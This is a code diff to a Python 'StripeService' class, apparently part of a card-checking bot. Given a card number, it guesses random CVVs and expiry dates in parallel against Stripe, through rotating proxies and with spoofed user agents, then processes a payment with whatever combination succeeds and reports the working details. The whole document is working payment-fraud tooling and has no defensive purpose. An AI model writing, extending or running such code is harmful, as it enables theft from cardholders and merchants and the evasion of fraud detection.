@@ -1,7 +1,7 @@
 import requests
 import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Optional, List
+from typing import Optional, List, Tuple
 from utils.proxy_manager import ProxyManager
 from fake_useragent import UserAgent
 
@@ -9,16 +9,31 @@ class StripeService:
     def __init__(self, proxy_manager: ProxyManager, user_agent: str = None):
         self.proxy_manager = proxy_manager
         self.user_agent = user_agent or UserAgent().random
-        self.max_retries = 5  # Maximum number of parallel retries
-        self.timeout = 10  # Reduced timeout for faster response
+        self.max_retries = 7  # Increased to 7 fast retries
+        self.timeout = 5  # Reduced timeout for faster response
 
-    def generate_cvv_batch(self, count: int = 10) -> List[str]:
-        """Generate a batch of random CVVs quickly"""
-        return [f"{random.randint(0, 999):03d}" for _ in range(count)]
+    def generate_variations(self) -> List[Tuple[str, str, str]]:
+        """Generate variations of CVV and expiry dates"""
+        variations = []
+        # Generate random CVVs
+        cvvs = [f"{random.randint(0, 999):03d}" for _ in range(7)]
+        
+        # Current month variations
+        current_month = "03"  # Example current month
+        months = [current_month, "01", "02", "03", "04", "05", "06"]
+        years = ["24", "25", "26", "27", "28"]
+        
+        for cvv in cvvs:
+            mm = random.choice(months)
+            yy = random.choice(years)
+            variations.append((cvv, mm, yy))
+        
+        return variations
 
-    def try_single_cvv(self, cc: str, mm: str, yy: str, cvv: str, proxy: dict) -> Optional[str]:
-        """Try a single CVV with error handling"""
+    def try_single_variation(self, cc: str, variation: Tuple[str, str, str], proxy: dict) -> Optional[str]:
+        """Try a single variation of CVV and expiry date"""
         try:
+            cvv, mm, yy = variation
             session = requests.Session()
             session.proxies.update(proxy)
 
@@ -55,15 +70,16 @@ class StripeService:
             )
 
             if response.ok and 'id' in response.json():
-                return response.json()['id']
+                return f"{response.json()['id']}|{cvv}|{mm}|{yy}"
             return None
 
         except Exception:
             return None
 
-    def process_payment(self, stripe_id: str, proxy: dict) -> Optional[str]:
+    def process_payment(self, stripe_data: str, proxy: dict) -> Optional[str]:
         """Process payment with the obtained stripe ID"""
         try:
+            stripe_id, cvv, mm, yy = stripe_data.split("|")
             session = requests.Session()
             session.proxies.update(proxy)
 
@@ -96,7 +112,7 @@ class StripeService:
             )
 
             if response.ok:
-                return response.text
+                return f"CVV: {cvv} | MM/YY: {mm}/{yy} | Response: {response.text}"
             return None
 
         except Exception:
@@ -104,33 +120,33 @@ class StripeService:
 
     def check_card(self, card: str) -> str:
         try:
-            cc, mm, yy, original_cvv = card.split("|")
+            cc, _, _, _ = card.split("|")  # Only use the card number, ignore provided mm/yy/cvv
             proxy = self.proxy_manager.get_random_proxy()
             if not proxy:
                 return "❌ **Error:** No proxies available"
 
-            # Generate multiple CVVs for parallel processing
-            cvvs = self.generate_cvv_batch(10)  # Generate 10 CVVs at once
+            # Generate variations for parallel processing
+            variations = self.generate_variations()
             successful_result = None
 
             with ThreadPoolExecutor(max_workers=self.max_retries) as executor:
-                # Submit all CVV attempts in parallel
-                future_to_cvv = {
-                    executor.submit(self.try_single_cvv, cc, mm, yy, cvv, proxy): cvv 
-                    for cvv in cvvs
+                # Submit all variations in parallel
+                future_to_variation = {
+                    executor.submit(self.try_single_variation, cc, variation, proxy): variation 
+                    for variation in variations
                 }
 
                 # Process results as they complete
-                for future in as_completed(future_to_cvv):
-                    stripe_id = future.result()
-                    if stripe_id:
+                for future in as_completed(future_to_variation):
+                    stripe_data = future.result()
+                    if stripe_data:
                         # If we get a successful stripe ID, process the payment
-                        payment_result = self.process_payment(stripe_id, proxy)
+                        payment_result = self.process_payment(stripe_data, proxy)
                         if payment_result:
-                            successful_result = f"✅ **Stripe ID:** {stripe_id}\n✅ **Response:** {payment_result}"
+                            successful_result = f"✅ **Success!**\n{payment_result}"
                             break
 
-            return successful_result or "❌ **Error:** All attempts failed"
+            return successful_result or "❌ **Error:** All attempts failed - Wrong CVV/Expiry"
 
         except Exception as e:
             return f"❌ **Error:** {str(e)}"
